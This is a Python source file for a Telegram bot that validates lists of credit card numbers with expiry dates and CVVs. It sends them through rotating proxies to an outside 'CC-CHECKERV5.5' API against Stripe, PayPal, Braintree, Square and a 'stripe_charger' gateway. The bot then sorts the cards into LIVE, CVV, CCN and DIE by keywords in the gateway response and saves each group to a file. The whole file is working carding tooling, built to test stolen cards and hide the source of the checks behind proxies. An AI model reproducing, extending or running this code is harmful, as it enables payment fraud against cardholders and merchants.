import asyncio
import configparser
import logging
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Tuple

import requests
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)


def format_cc_line(line: str) -> Tuple[str, str, str, str]:
    line = line.strip()
    if not line:
        return "", "", "", ""

    if "|" in line:
        parts = line.split("|")
    elif ":" in line:
        parts = line.split(":")
    else:
        return "", "", "", ""

    if len(parts) < 4:
        return "", "", "", ""

    cc, month, year, cvv = [part.strip() for part in parts[:4]]
    if len(year) == 2:
        year = f"20{year}"

    return cc, month, year, cvv


class TelegramChecker:
    def __init__(self):
        self.config = configparser.ConfigParser()
        self.settings_file = "settings.ini"
        self.api = ""
        self.apikey = ""
        self.proxy_auth = ""
        self.type_proxy = "http"
        self.result_dir = "result"
        self.gateway_choices = {
            "vbv",
            "stripe",
            "paypal",
            "braintree",
            "square",
            "stripe_charger",
        }

        if not os.path.exists(self.result_dir):
            os.makedirs(self.result_dir)

        self.load_settings()

    def load_settings(self):
        if not os.path.exists(self.settings_file):
            self.create_default_settings()

        self.config.read(self.settings_file)
        self.api = self.config.get("API", "endpoint", fallback="")
        self.apikey = self.config.get("API", "apikey", fallback="")
        self.proxy_auth = self.config.get("PROXY", "auth", fallback="")
        self.type_proxy = self.config.get("PROXY", "type", fallback="http")

    def create_default_settings(self):
        self.config["API"] = {
            "endpoint": "your-api-server.com",
            "apikey": "your_api_key_here",
        }
        self.config["PROXY"] = {
            "auth": "username:password",
            "type": "http",
        }
        self.config["TELEGRAM"] = {
            "token": "your_telegram_bot_token_here",
        }

        with open(self.settings_file, "w") as configfile:
            self.config.write(configfile)

        raise RuntimeError(
            f"Created default {self.settings_file}. Configure it before running the bot."
        )

    def parse_cards(self, text: str) -> List[str]:
        cards: List[str] = []
        for raw_line in text.splitlines():
            cc, month, year, cvv = format_cc_line(raw_line)
            if cc and month and year and cvv:
                cards.append(f"{cc}|{month}|{year}|{cvv}")
        return cards

    def parse_proxies(self, text: str) -> List[str]:
        proxies: List[str] = []
        for raw_line in text.splitlines():
            line = raw_line.strip()
            if line and ":" in line:
                proxies.append(line)
        return proxies

    def build_url(self, cc_data: str, proxy: str, gateway: str) -> str:
        return (
            f"https://{self.api}/checker/CC-CHECKERV5.5/?list={cc_data}"
            f"&apikey={self.apikey}&proxy={proxy}&proxyAuth={self.proxy_auth}"
            f"&type_proxy={self.type_proxy}&gate={gateway}"
        )

    def check_cc(self, cc_data: str, proxy: str, gateway: str) -> Dict[str, Any]:
        url = self.build_url(cc_data, proxy, gateway)
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if "data" in data and "info" in data["data"]:
                    info = data["data"]["info"]
                    return {
                        "cc": cc_data,
                        "valid": info.get("valid", False),
                        "bin": info.get("bin", ""),
                        "scheme": info.get("scheme", ""),
                        "type": info.get("type", ""),
                        "bank_name": info.get("bank_name", ""),
                        "country": info.get("country", ""),
                        "msg": info.get("msg", ""),
                        "gateway": info.get("gateway", ""),
                        "response": data,
                    }
                return {"cc": cc_data, "error": "Invalid response format", "response": data}
            return {"cc": cc_data, "error": f"HTTP Error: {response.status_code}"}
        except Exception as exc:  # noqa: BLE001
            return {"cc": cc_data, "error": f"Request failed: {exc}"}

    def categorize(self, result: Dict[str, Any]) -> Tuple[str, str]:
        if "error" in result:
            return "ERROR", result["error"]

        msg = result.get("msg", "").lower()
        live_keywords = [
            "approved",
            "success",
            "approv",
            "thank you",
            "cvc_check",
            "one-time",
            "succeeded",
            "authenticate successful",
            "authenticate attempt successful",
            "authenticate unavailable",
            "authenticate unable to authenticate",
        ]
        cvv_keywords = [
            "transaction_not_allowed",
            "authentication_required",
            "your card zip code is incorrect",
            "card_error_authentication_required",
            "three_d_secure_redirect",
            "invalid_billing_address",
            "address_verification_failure",
        ]
        ccn_keywords = [
            "incorrect_cvc",
            "invalid_cvc",
            "insufficient_funds",
            "invalid_security_code",
            "cvv_failure",
        ]
        die_keywords = ["failed"]

        is_live = any(keyword in msg for keyword in live_keywords)
        is_cvv = any(keyword in msg for keyword in cvv_keywords)
        is_ccn = any(keyword in msg for keyword in ccn_keywords)
        is_die = any(keyword in msg for keyword in die_keywords) or not result.get("valid", False)

        if is_live:
            return "LIVE", msg
        if is_cvv:
            return "CVV", msg
        if is_ccn:
            return "CCN", msg
        if is_die:
            return "DIE", msg
        return "UNKNOWN", msg

    def save_result(self, filename: str, cc_data: str, message: str, response: Any):
        filepath = os.path.join(self.result_dir, filename)
        with open(filepath, "a", encoding="utf-8") as file:
            file.write(f"{cc_data} | {message} | {response}\n")

    def run_checks(
        self, cc_list: List[str], proxies: List[str], gateway: str, threads: int
    ) -> Dict[str, Any]:
        start_time = time.time()
        summary: Dict[str, Any] = {
            "total": len(cc_list),
            "counts": {"LIVE": 0, "CVV": 0, "CCN": 0, "DIE": 0, "ERROR": 0, "UNKNOWN": 0},
            "samples": {"LIVE": [], "CVV": [], "CCN": [], "DIE": [], "ERROR": [], "UNKNOWN": []},
        }

        proxy_index = 0
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for cc in cc_list:
                proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
                futures.append(executor.submit(self.check_cc, cc, proxy, gateway))

            for future in as_completed(futures):
                result = future.result()
                status, message = self.categorize(result)
                summary["counts"][status] = summary["counts"].get(status, 0) + 1
                if len(summary["samples"][status]) < 5:
                    summary["samples"][status].append({"cc": result.get("cc", ""), "message": message})
                self.save_result(f"{status}.txt", result.get("cc", ""), message, result.get("response"))

        summary["elapsed"] = time.time() - start_time
        return summary


def get_bot_token(settings_file: str) -> str:
    token = os.getenv("BOT_TOKEN") or os.getenv("TELEGRAM_BOT_TOKEN")
    if token:
        return token

    config = configparser.ConfigParser()
    if not os.path.exists(settings_file):
        return ""

    config.read(settings_file)
    return config.get("TELEGRAM", "token", fallback="")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send /cards followed by your CC list and /proxies followed by your proxies.\n"
        "Then run /check <gateway> <threads>. Example: /check stripe 5."
    )


def extract_payload(text: str) -> str:
    parts = text.split(maxsplit=1)
    if len(parts) == 2:
        return parts[1]
    return ""


async def handle_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    payload = extract_payload(update.message.text or "")
    if not payload:
        await update.message.reply_text("Please provide card lines after /cards.")
        return

    checker: TelegramChecker = context.bot_data["checker"]
    cards = checker.parse_cards(payload)
    if not cards:
        await update.message.reply_text("No valid card lines were found.")
        return

    context.user_data["cards"] = cards
    await update.message.reply_text(f"Stored {len(cards)} cards for this chat.")


async def handle_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    payload = extract_payload(update.message.text or "")
    if not payload:
        await update.message.reply_text("Please provide proxies after /proxies.")
        return

    checker: TelegramChecker = context.bot_data["checker"]
    proxies = checker.parse_proxies(payload)
    if not proxies:
        await update.message.reply_text("No valid proxies were found.")
        return

    context.user_data["proxies"] = proxies
    await update.message.reply_text(f"Stored {len(proxies)} proxies for this chat.")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if document is None:
        return

    checker: TelegramChecker = context.bot_data["checker"]
    file = await document.get_file()
    content = await file.download_as_bytearray()
    text = content.decode("utf-8", errors="ignore")

    target = "cards"
    filename_lower = (document.file_name or "").lower()
    if "proxy" in filename_lower:
        target = "proxies"
    elif "card" in filename_lower:
        target = "cards"

    if target == "cards":
        parsed = checker.parse_cards(text)
    else:
        parsed = checker.parse_proxies(text)

    if not parsed:
        await update.message.reply_text("The uploaded file did not contain valid lines.")
        return

    context.user_data[target] = parsed
    await update.message.reply_text(
        f"Stored {len(parsed)} {target} from {document.file_name or 'the uploaded file'}."
    )


def validate_gateway(gateway: str, checker: TelegramChecker) -> bool:
    return gateway in checker.gateway_choices


def validate_threads(thread_text: str) -> int:
    try:
        value = int(thread_text)
    except ValueError:
        return -1
    if 3 <= value <= 10:
        return value
    return -1


async def run_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    checker: TelegramChecker = context.bot_data["checker"]
    if not context.args:
        await update.message.reply_text("Usage: /check <gateway> <threads>")
        return

    gateway = context.args[0].lower()
    if not validate_gateway(gateway, checker):
        await update.message.reply_text(
            "Invalid gateway. Use one of: " + ", ".join(sorted(checker.gateway_choices))
        )
        return

    threads = 3
    if len(context.args) > 1:
        threads = validate_threads(context.args[1])
        if threads == -1:
            await update.message.reply_text("Threads must be a number between 3 and 10.")
            return

    cards = context.user_data.get("cards", [])
    proxies = context.user_data.get("proxies", [])
    if not cards:
        await update.message.reply_text("No cards stored. Send them with /cards or upload a file.")
        return
    if not proxies:
        await update.message.reply_text("No proxies stored. Send them with /proxies or upload a file.")
        return

    await update.message.reply_text(
        f"Starting check with gateway '{gateway}' using {threads} threads on {len(cards)} cards."
    )

    loop = asyncio.get_running_loop()
    summary = await loop.run_in_executor(
        None, lambda: checker.run_checks(cards, proxies, gateway, threads)
    )

    formatted = format_summary(summary)
    await update.message.reply_text(formatted, parse_mode=ParseMode.MARKDOWN)


def format_summary(summary: Dict[str, Any]) -> str:
    lines = [
        f"*Total checked:* {summary.get('total', 0)}",
        f"*Time:* {summary.get('elapsed', 0):.2f}s",
        "*Results:*",
    ]

    for status, count in summary.get("counts", {}).items():
        lines.append(f"- {status}: {count}")
        samples = summary.get("samples", {}).get(status, [])
        if samples:
            for sample in samples:
                cc = sample.get("cc", "")
                msg = sample.get("message", "")
                lines.append(f"    • `{cc}` — {msg}")

    return "\n".join(lines)


def build_application() -> Application:
    token = get_bot_token("settings.ini")
    if not token:
        raise RuntimeError(
            "Telegram bot token not provided. Set BOT_TOKEN env var or TELEGRAM token in settings.ini."
        )

    checker = TelegramChecker()
    application = Application.builder().token(token).build()
    application.bot_data["checker"] = checker

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cards", handle_cards))
    application.add_handler(CommandHandler("proxies", handle_proxies))
    application.add_handler(CommandHandler("check", run_check))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    return application


def main():
    application = build_application()
    application.run_polling()


if __name__ == "__main__":
    main()
